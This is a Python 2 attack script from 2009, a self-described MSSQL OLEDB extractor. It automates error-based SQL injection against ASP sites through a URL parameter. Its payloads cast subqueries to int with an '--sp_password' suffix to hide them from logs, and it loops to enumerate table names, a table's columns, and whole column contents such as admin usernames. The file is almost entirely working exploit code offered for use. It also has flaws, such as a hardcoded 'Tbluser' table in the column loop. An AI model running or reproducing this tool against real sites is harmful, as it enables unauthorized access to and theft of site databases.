#!/usr/bin/python
#Author: Godwin Austin
#Date  : Feb 9 2009

#This tool is my first ever program wtitten in any language 
#So it has to have many bugs within
#So dont brake me apart if it has some problems.
#I will be happy if the tool comes handy to someone
#And i will be more than happy if someone developes it.
#The tool further needs to have file output function and proxyfication function mainly.
import re, sys, os, urllib , types


if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'
os.system(SysCls) #comment out this line for making it work on symbian OS like pys60 
if len(sys.argv) <= 1:
        print "\n|###############################################################|"
        print "| godwinaustin20[@]gmail[dot]com                         v5.0   |"
        print "|        odebdstract.py   	                                |"
        print "|      -MSSQL OLEDB extractor                                   |"
        print "|###############################################################|"
 

for arg in sys.argv:
        if arg == "-h":
			print "\n\n"
	                print "   Usage: ./oledbstract.py [options]                          godwinaustin20[@]gmail[dot]com"
			print "\tDefine: -u        URL \"http://www.site.com/news.asp?id=\""
			print "\tDefine: -T        table_name"
			print "\tDefine: -C        column_name"
			print "   Ex: ./oledbstract.py  -u \"www.site.com/news.asp?id=\""
                        print "   Ex: ./oledbstract.py  -u \"www.site.com/news.asp?id=\" -T Admin" 
                        print "   Ex: ./oledbstract.py  -u \"www.site.com/news.asp?id=\" -T Admin -C username" 
			sys.exit()
mode = ""
count = 0
site = ""
tables = []
columns = []
stable = ""
mode1 = ""
dump = ""
dumps = []
firsttab = "convert(int,(select+top+1+table_name+from+information_schema.tables))---sp_password"
for arg in sys.argv:
	if arg == "-u" :
		try:
			site = sys.argv[count+1]
		except :
			print "Give the URL"
			sys.exit()
	elif arg == "-T" :
		mode = "colstract"
		stable = sys.argv[count+1]
	elif arg == "-C" :
		scolumn = sys.argv[count+1]
		mode1 = "coldump"
	count+=1
compurl = re.compile(r'^http://.+=$')
checkurl = compurl.search(site)
if checkurl : # Check the syntax of the URL
	print "\tThe given URL format is allright"
else :
	print "\tThe URL must be given from 'http:// upto the mark of '='"
	print "\n\teg: http://www.site.com/index.asp?id= "
	sys.exit()

try :
	sock = urllib.urlopen(site+firsttab)
	

except :
	print "\tUnable to reach to the site"
	sys.exit()
if mode == "colstract" and mode1 != "coldump" : # Extracting column names of given table 
	firstcol = "convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='"+stable+"'))--sp_password"
	try :
		sock1 = urllib.urlopen(site+firstcol)
	except :
		print "\tUnable to reach to the site"
	sockread1 = str(sock1.readlines())
	compcol = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
	try :
		grepcol = compcol.search(sockread1).group()
	except :
		print "Unable to extract ... May be manual try will work"
		print "May be the site is not vulnurable for inbound SQL injections"
		sys.exit()
	startstringcolcomp =re.compile(r"value +\\+'")
	endstringcolcomp = re.compile(r"\\+' +to")
	try :
		startcolstring = startstringcolcomp.search(grepcol).group()
		endcolstring = endstringcolcomp.search(grepcol).group()
	except :
		print "Output not understood by the tool"
		sys.exit()
	column = grepcol.replace(startcolstring , "")
	column = column.replace(endcolstring , "")
	columns = [column]

	print "\n\tColumns Found in table", stable , ":\n"

	
	while 1 :
	
		print "\t", columns[-1]
		element1 = "','".join(columns)
		nextcol = "convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='Tbluser'+and+COLUMN_NAME+NOT+IN+(\'"+element1+"\')))--sp_password"
		sock1 = urllib.urlopen(site+nextcol)
		sockread1 = str(sock1.readlines())
		compcol = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
		grepcol = compcol.search(sockread1)
		if type(grepcol) == types.NoneType :
			print "\tEnd of columns"
			sys.exit()
		else :
			pass
		grepcol = grepcol.group()
		startstringcolcomp =re.compile(r"value +\\+'")
		startcolstring = startstringcolcomp.search(grepcol).group()
		endstringcolcomp = re.compile(r"\\+' +to")
		endcolstring = endstringcolcomp.search(grepcol).group()
		column = grepcol.replace(startcolstring , "")
		column = column.replace(endcolstring , "")
		columns.extend([column])




if mode1 == "coldump" : # Dumping the data in givin column of the specific table
	firstdump = "convert(int,(SELECT+top+1+"+scolumn+"+FROM+"+stable+"))--"
	try :
		sock2 = urllib.urlopen(site+firstdump)
	except :
		print "\tUnable to reach to the site"
	sockread2 = str(sock2.readlines())
	compdump = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
	try :
		grepdump = compdump.search(sockread2).group()
	except :
		print "Unable to extract ... May be manual try will work"
		print "May be the site is not vulnurable for inbound SQL injections"
		sys.exit()
	startstringdumpcomp =re.compile(r"value +\\+'")
	endstringdumpcomp = re.compile(r"\\+' +to")
	try :
		startdumpstring = startstringdumpcomp.search(grepdump).group()
		enddumpstring = endstringdumpcomp.search(grepdump).group()
	except :
		print "Output not understood by the tool"
		sys.exit()
	dump = grepdump.replace(startdumpstring , "")
	dump = dump.replace(enddumpstring , "")
	dumps = [dump]

	print "\n\tData Found in column", scolumn , ":\n"

	
	while 1 :
	
		print "\t", dumps[-1]
		element2 = "','".join(dumps)
		nextdump = "convert(int,(select+top+1+"+scolumn+"+from+"+stable+"+where+"+scolumn+"+NOT+in+(\'"+element2+"\')++order+by+"+scolumn+"+desc))--"
		sock2 = urllib.urlopen(site+nextdump)
		sockread2 = str(sock2.readlines())
		compdump = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
		grepdump = compdump.search(sockread2)
		if type(grepdump) == types.NoneType :
			print "\tEnd of Data"
			sys.exit()
		else :
			pass
		grepdump = grepdump.group()
		startstringdumpcomp =re.compile(r"value +\\+'")
		startdumpstring = startstringdumpcomp.search(grepdump).group()
		endstringdumpcomp = re.compile(r"\\+' +to")
		enddumpstring = endstringdumpcomp.search(grepdump).group()
		dump = grepdump.replace(startdumpstring , "")
		dump = dump.replace(enddumpstring , "")
		dumps.extend([dump])

# Dumping the Table names
sockread = str(sock.readlines())

comptab = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
try :
	greptab = comptab.search(sockread).group()
except :
	print "Unable to extract ... May be manual try will work"
	print "May be the site is not vulnurable for inbound SQL injections"
	sys.exit()
startstringcomp =re.compile(r"value +\\+'")
endstringcomp = re.compile(r"\\+' +to")
try :
	startstring = startstringcomp.search(greptab).group()
	endstring = endstringcomp.search(greptab).group()
except :
	print "Output not understood by the tool"
	sys.exit()
table = greptab.replace(startstring , "")
table = table.replace(endstring , "")
tables = [table]

print "\n\tTables Found :\n"

while 1 :
	
	print "\t", tables[-1]
	element = "','".join(tables)
	nexttab = "convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+(\'"+element+"\')))--sp_password"
	sock = urllib.urlopen(site+nexttab)
	sockread = str(sock.readlines())
	comptab = re.compile(r"\bvalue\b +\\+'.+\\+' +\bto\b")
	greptab = comptab.search(sockread)
	if type(greptab) == types.NoneType :
		print "\tEnd of tables"
		sock.close()
		sys.exit()
	else :
		pass
	greptab = greptab.group()
	startstringcomp =re.compile(r"value +\\+'")
	startstring = startstringcomp.search(greptab).group()
	endstringcomp = re.compile(r"\\+' +to")
	endstring = endstringcomp.search(greptab).group()
	table = greptab.replace(startstring , "")
	table = table.replace(endstring , "")
	tables.extend([table])
	


try :
	sock.close()
except :
	pass
try :
	sock1.close()
except :
	pass
try :
	sock2.close()
except:
	pass

#END
